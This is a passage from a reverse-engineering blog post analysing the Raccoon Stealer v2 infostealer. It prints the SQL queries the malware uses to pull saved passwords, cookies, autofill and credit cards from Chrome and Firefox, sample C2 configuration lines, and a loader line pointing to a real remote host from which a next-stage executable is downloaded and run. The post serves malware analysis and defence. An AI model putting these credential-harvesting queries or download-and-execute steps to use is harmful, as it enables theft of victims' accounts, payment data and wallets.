        data-src="/raccoon-stealer/img/PATH_dlls.png"
        data-srcset="/raccoon-stealer/img/PATH_dlls.png, /raccoon-stealer/img/PATH_dlls.png 1.5x, /raccoon-stealer/img/PATH_dlls.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/PATH_dlls.png"
        title="dlls" width="659" height="524" /></p>
<p>The malware collects information about the system through the function call a <code>sub_004097BB</code> , it search for the word <code>sstmnfo_</code> in the response of the C2 Server and the data to be collected is determined in the response, after a colon <code>:</code> and a pipe <code>|</code> between the key words of the data.
Then, it begin collecting information about the system:</p>
<ol>
<li>
<p>The locale information
the data is formatted in the following format - Locale: <locale information></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/locale.png"
        data-srcset="/raccoon-stealer/img/locale.png, /raccoon-stealer/img/locale.png 1.5x, /raccoon-stealer/img/locale.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/locale.png"
        title="locale" width="619" height="549" /></p>
</li>
<li>
<p>Time zone information
the data is formatted in the form: - Time zone: &lt;%c%ld&gt; minutes from GMT</p>
</li>
<li>
<p>OS Version
retrieves the OS version by reading the registry key <code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName</code> and the data formatted in the form: - OS: &lt;%s OS&gt;</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/os.png"
        data-srcset="/raccoon-stealer/img/os.png, /raccoon-stealer/img/os.png 1.5x, /raccoon-stealer/img/os.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/os.png"
        title="os" width="910" height="512" /></p>
</li>
<li>
<p>system Architecture
By calling <code>GetSystemWow64DirectoryW</code> that retrieves the path of of the system directory used by WOW64 that only exist in x64 Architecture. The data formated in form: - Architecture: x&lt;%d Architecture&gt;</p>
</li>
<li>
<p>RAM status
gets the memory status by calling <code>GlobalMemoryStatusEx</code> that retrieves both the virtual and physical memory usage and format in the form: - RAM: &lt;%d RAM Usage&gt; MB</p>
</li>
<li>
<p>CPU specifications
Using instruction <code>cpuid</code> to retrieve the processor specification. This instruction output depends on the value in the <code>eax</code> register. The call to <code>cpuid</code> with <code>eax = 0x80000002 , 0x80000003 and 0x80000004 </code> gets Processor Brand String .Also it uses <code>GetSystemInfo</code> API to get the number of processors. And send it in the format: - CPU: &lt;%s CPU Brand&gt; (&lt;%d Cores number&gt; cores)</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/cpu.png"
        data-srcset="/raccoon-stealer/img/cpu.png, /raccoon-stealer/img/cpu.png 1.5x, /raccoon-stealer/img/cpu.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/cpu.png"
        title="cpu" width="764" height="554" /></p>
</li>
<li>
<p>Display
Get the display information by calling <code>GetSystemMetrics</code> with index 0 to retrieves The width of the screen of the primary display monitor and format it in form: - Display size: &lt;%d&gt;x&lt;%d&gt;</p>
</li>
<li>
<p>Display devices - Display Devices: &lt;%s&gt;</p>
</li>
<li>
<p>Display Name And version
Get this information from the registry <code>SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</code> And the Specific GUID to get the display name and version
Then it generate a random value and append it to the content-Type header and save the data to a file to send it to the attacker C2 server</p>
</li>
</ol>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/sstmnfo.png"
        data-srcset="/raccoon-stealer/img/sstmnfo.png, /raccoon-stealer/img/sstmnfo.png 1.5x, /raccoon-stealer/img/sstmnfo.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/sstmnfo.png"
        title="sstmnfo" width="592" height="537" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/send_data.png"
        data-srcset="/raccoon-stealer/img/send_data.png, /raccoon-stealer/img/send_data.png 1.5x, /raccoon-stealer/img/send_data.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/send_data.png"
        title="send" width="1358" height="244" /></p>
<p>That&rsquo;s all with <code>sstmnfo_</code> expected functionality. Lets explore the rest of the capabilities of the malware.</p>
<h3 id="steal-user-information-saved-in-browser">Steal User information saved in Browser</h3>
<h4 id="chrome-based">Chrome Based</h4>
<p>The malware then Loads <code>sqlite3.dll</code> and call the function at <code>sub_00403FAB</code>. This function is basically allocates two regions of memory and get the paths of <code>%AppData%</code> and <code>%LocalAppData%</code> directories and then transfer the flow to another functions</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/steal_wrap.png"
        data-srcset="/raccoon-stealer/img/steal_wrap.png, /raccoon-stealer/img/steal_wrap.png 1.5x, /raccoon-stealer/img/steal_wrap.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/steal_wrap.png"
        title="steal" width="697" height="512" /></p>
<p>lets explore the first function call <code> sub_401B13</code>. It recursively search for <code>User Data</code> directory and then goes to <code>sub_401E26</code> that have all the functionality. It first start looking for <code>Local State</code> file and reads it and search for <code>&quot;encrypted_key&quot;:&quot; </code> in it and in the same way, it did with <code>stats_version&quot;:&quot;</code> .</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/enc_key.png"
        data-srcset="/raccoon-stealer/img/enc_key.png, /raccoon-stealer/img/enc_key.png 1.5x, /raccoon-stealer/img/enc_key.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/enc_key.png"
        title="enc" width="734" height="152" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/stats_version.png"
        data-srcset="/raccoon-stealer/img/stats_version.png, /raccoon-stealer/img/stats_version.png 1.5x, /raccoon-stealer/img/stats_version.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/stats_version.png"
        title="stats" width="689" height="153" /></p>
<p>Then, It starts to resolve some functions from <code>sqlite3.dll</code> to use them. And get the path to <code>Login Data</code> file and copies it to another file.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/sqlite3_resolving.png"
        data-srcset="/raccoon-stealer/img/sqlite3_resolving.png, /raccoon-stealer/img/sqlite3_resolving.png 1.5x, /raccoon-stealer/img/sqlite3_resolving.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/sqlite3_resolving.png"
        title="sqliteAPI" width="669" height="606" /></p>
<p>It opens a new database connection to <code>Login Data</code> copied file with <code>sqlite3_open</code> function call then it execute SQL statement:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">origin_url</span><span class="p">,</span><span class="w"> </span><span class="n">username_value</span><span class="p">,</span><span class="w"> </span><span class="n">password_value</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">logins</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>to steal the saved username &amp; password and its associated origin URL</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/sqlite_usr_pass.png"
        data-srcset="/raccoon-stealer/img/sqlite_usr_pass.png, /raccoon-stealer/img/sqlite_usr_pass.png 1.5x, /raccoon-stealer/img/sqlite_usr_pass.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/sqlite_usr_pass.png"
        title="user Pass" width="872" height="151" /></p>
<p>Actually, To execute that SQL statement, <code>sqlite3_step</code> should be called. the return value of <code>sqlite3_step</code> can be different so, it checks if the return value is 100 this means that there is another row of output is available.
To retrieve the content of the database a call to <code>sqlite3_column_bytes16</code> that returns the size of the data and <code>sqlite3_column_text16</code> to the content as plain text</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/get_usr_pass.png"
        data-srcset="/raccoon-stealer/img/get_usr_pass.png, /raccoon-stealer/img/get_usr_pass.png 1.5x, /raccoon-stealer/img/get_usr_pass.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/get_usr_pass.png"
        title="usr pass" width="641" height="421" /></p>
<p>After collecting these data it format it in the following form in a file <code>\passwords.txt</code> to send it:
<code>URL:%s USR:%s PASS:%s</code>
In the same way, It get the cookies using the SQL statment:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">host_key</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="n">is_secure</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">expires_utc</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">encrypted_value</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">cookies</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>and format it in the following form in a file <code>\cookies.txt</code> to send it:
<code>%s TRUE %s %s %s %s %s</code></p>
<p>It gets the autofill content name and value pairs in the same way using the SQL query</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">autofill</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>and saved the data to a file <code>\autofill.txt</code> to send it.</p>
<p>then, it reads the content of <code>Web Data</code> file to extract Credit Card information using the SQL query:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">name_on_card</span><span class="p">,</span><span class="w"> </span><span class="n">card_number_encrypted</span><span class="p">,</span><span class="w"> </span><span class="n">expiration_month</span><span class="p">,</span><span class="w"> </span><span class="n">expiration_year</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">credit_cards</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>and format in the following form in a file <code>\CC.txt</code> to send it:
<code>NUM:%s HOLDER:%s EXP:%s/%s</code>
and it did the whole thing with the files in <code>Default</code> path for the browser</p>
<h4 id="firefox">FireFox</h4>
<p>FireFox Browsers are a little bit different so, it collects the data from it but needs to do different steps.
First it goes to Profiles and search for <code>cookies.sqlite</code> and it opens it using sqlite3 and get the cookies using SQL query:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">host</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="p">,</span><span class="w"> </span><span class="n">isSecure</span><span class="p">,</span><span class="w"> </span><span class="n">expiry</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">moz_cookies</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>then, The login information from <code>logins.json</code> and dumping the passwords using <code>PK11SDR_Decrypt</code> function call.</p>
<p>Then, it goes to <code>formhistory.sqlite</code> to get the Autofill information using SQL query:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">fieldname</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">moz_formhistory</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="steal-crypto-wallets-information">Steal Crypto wallets information</h3>
<p>If the response has the word <code>wlts_</code> then, the malware tries to collect all crypto wallets information from the victim. Basically it navigate all the file system searching for a pattern. And in the same way, It navigate the whole system searching for <code>wallet.dat</code> which is a bitcoin wallet. and if it found, sends it to the server.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/wallet.png"
        data-srcset="/raccoon-stealer/img/wallet.png, /raccoon-stealer/img/wallet.png 1.5x, /raccoon-stealer/img/wallet.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/wallet.png"
        title="wallet" width="393" height="159" /></p>
<p>Response be like:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">wlts_exodus:Exodus;26;exodus;*;*partitio*,*cache*,*dictionar*
</span></span><span class="line"><span class="cl">wlts_atomic:Atomic;26;atomic;*;*cache*,*IndexedDB*
</span></span><span class="line"><span class="cl">wlts_jaxxl:JaxxLiberty;26;com.liberty.jaxx;*;*cache*
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="grabbing-files">grabbing Files</h3>
<p>If the response has the word <code>grbr_</code> search for the specified file in the system and upload it to the attacker.
the response be like:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">grbr_dekstop:%USERPROFILE%\Desktop\|*.txt, *.doc, *pdf*|-|5|1|0|files
</span></span><span class="line"><span class="cl">grbr_documents:%USERPROFILE%\Documents\|*.txt, *.doc, *pdf*|-|5|1|0|files
</span></span><span class="line"><span class="cl">grbr_downloads:%USERPROFILE%\Downloads\|*.txt, *.doc, *pdf*|-|5|1|0|files
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="telegram-connection">Telegram connection</h3>
<p>The malware can collect Telegram Desktop application data if the response has the word <code>tlgrm_</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">tlgrm_Telegram:Telegram Desktop\tdata|*|*emoji*,*user_data*,*tdummy*,*dumps*
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/telegram.png"
        data-srcset="/raccoon-stealer/img/telegram.png, /raccoon-stealer/img/telegram.png 1.5x, /raccoon-stealer/img/telegram.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/telegram.png"
        title="telegram" width="639" height="121" /></p>
<p>It search for a file specified in the response from the server and navigate to it and copy it to send to the attacker.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/tlgrm_file.png"
        data-srcset="/raccoon-stealer/img/tlgrm_file.png, /raccoon-stealer/img/tlgrm_file.png 1.5x, /raccoon-stealer/img/tlgrm_file.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/tlgrm_file.png"
        title="telegram file" width="625" height="440" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/send_tlgrm.png"
        data-srcset="/raccoon-stealer/img/send_tlgrm.png, /raccoon-stealer/img/send_tlgrm.png 1.5x, /raccoon-stealer/img/send_tlgrm.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/send_tlgrm.png"
        title="send" width="864" height="378" /></p>
<h3 id="take-screenshot">Take screenshot</h3>
<p>To take a screenshot the response should have the word <code>scrnsht_</code>. First, It resolves APIs from <code>GdiPlus.dll and Gdi32.dll</code> to take a screenshot.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/gdi.png"
        data-srcset="/raccoon-stealer/img/gdi.png, /raccoon-stealer/img/gdi.png 1.5x, /raccoon-stealer/img/gdi.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/gdi.png"
        title="gdi" width="674" height="589" /></p>
<p>All APIs resolved:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">  GdiplusStartup
</span></span><span class="line"><span class="cl">  GdipDisposeImage
</span></span><span class="line"><span class="cl">  GdipGetImageEncoders
</span></span><span class="line"><span class="cl">  GdipGetImageEncodersSize
</span></span><span class="line"><span class="cl">  GdipCreateBitmapFromHBITMAP
</span></span><span class="line"><span class="cl">  GdipSaveImageToFile
</span></span><span class="line"><span class="cl">  BitBlt
</span></span><span class="line"><span class="cl">  CreateCompatibleBitmap
</span></span><span class="line"><span class="cl">  CreateCompatibleDC
</span></span><span class="line"><span class="cl">  DeleteObject
</span></span><span class="line"><span class="cl">  GetObjectW
</span></span><span class="line"><span class="cl">  SelectObject
</span></span><span class="line"><span class="cl">  SetStretchBltMode
</span></span><span class="line"><span class="cl">  StretchBlt
</span></span><span class="line"><span class="cl">  DC
</span></span></code></pre></td></tr></table>
</div>
</div><p>The malware uses these APIs to take a screenshots from the victim system and send them to the attacker</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/scrnsht.png"
        data-srcset="/raccoon-stealer/img/scrnsht.png, /raccoon-stealer/img/scrnsht.png 1.5x, /raccoon-stealer/img/scrnsht.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/scrnsht.png"
        title="screenshot" width="2095" height="554" /></p>
<h3 id="loading-next-stage">Loading Next stage</h3>
<p>The malware can drop a next stage malware specified in the response from the server containing <code>ldr_</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">ldr_1:http://94.158.244.119/U4N9B5X5F5K2A0L4L4T5/84897964387342609301.bin|%TEMP%\|exe
</span></span></code></pre></td></tr></table>
</div>
</div><p>The malware open a connection to the server and download the content of the file specified in the response to the system</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/ldr.png"
        data-srcset="/raccoon-stealer/img/ldr.png, /raccoon-stealer/img/ldr.png 1.5x, /raccoon-stealer/img/ldr.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/ldr.png"
        title="ldr" width="655" height="572" /></p>
<p>The malware then execute the downloaded file using <code>ShellExecute</code> API call</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/shell_open.png"
        data-srcset="/raccoon-stealer/img/shell_open.png, /raccoon-stealer/img/shell_open.png 1.5x, /raccoon-stealer/img/shell_open.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/shell_open.png"
        title="shell" width="335" height="135" /></p>
<p>That&rsquo;s all, The malware clear the files that created and release the allocated memory regions</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/raccoon-stealer/img/free.png"
        data-srcset="/raccoon-stealer/img/free.png, /raccoon-stealer/img/free.png 1.5x, /raccoon-stealer/img/free.png 2x"
        data-sizes="auto"
        alt="/raccoon-stealer/img/free.png"
        title="free" width="706" height="589" /></p>
<h2 id="iocs">IOCs:</h2>
<ul>
<li>sha256: 022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf06167e03</li>
<li>51.195.166[.]184</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://any.run/cybersecurity-blog/raccoon-stealer-v2-malware-analysis/" target="_blank" rel="noopener noreffer ">https://any.run/cybersecurity-blog/raccoon-stealer-v2-malware-analysis/</a></li>
<li><a href="https://bazaar.abuse.ch/sample/022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf06167e03/" target="_blank" rel="noopener noreffer ">https://bazaar.abuse.ch/sample/022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf06167e03/</a></li>
<li><a href="https://blog.sekoia.io/raccoon-stealer-v2-part-2-in-depth-analysis/" target="_blank" rel="noopener noreffer ">https://blog.sekoia.io/raccoon-stealer-v2-part-2-in-depth-analysis/</a></li>
<li><a href="https://www.sqlite.org/c3ref/funclist.html" target="_blank" rel="noopener noreffer ">https://www.sqlite.org/c3ref/funclist.html</a></li>
<li><a href="https://www.sqlite.org/rescode.html" target="_blank" rel="noopener noreffer ">https://www.sqlite.org/rescode.html</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2023-01-16&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/0bb29a5259d6403206a6992f9d4cdadee5a34781" target="_blank" title="commit by mohamedadel46(muhammed195826@feng.bu.edu.eg) 0bb29a5259d6403206a6992f9d4cdadee5a34781: originLogger post">
                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>0bb29a5</a></span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/raccoon-stealer/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://d01a.github.io/raccoon-stealer/" data-title="Raccoon Stealer" data-via="0xd01a" data-hashtags="Malware Analysis,Reverse Engineering"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://d01a.github.io/raccoon-stealer/" data-hashtag="Malware Analysis"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://d01a.github.io/raccoon-stealer/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://d01a.github.io/raccoon-stealer/" data-title="Raccoon Stealer"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://d01a.github.io/raccoon-stealer/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://d01a.github.io/raccoon-stealer/" data-title="Raccoon Stealer"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://d01a.github.io/raccoon-stealer/" data-title="Raccoon Stealer"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Trello" data-sharer="trello" data-url="https://d01a.github.io/raccoon-stealer/" data-title="Raccoon Stealer" data-description="Raccoon Stealer"><i class="fab fa-trello fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/malware-analysis/">Malware Analysis</a>,&nbsp;<a href="/tags/reverse-engineering/">Reverse Engineering</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav">
            <a href="/originlogger/" class="next" rel="next" title="OriginLogger Loader">OriginLogger Loader<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.102.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mohamed Adel</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
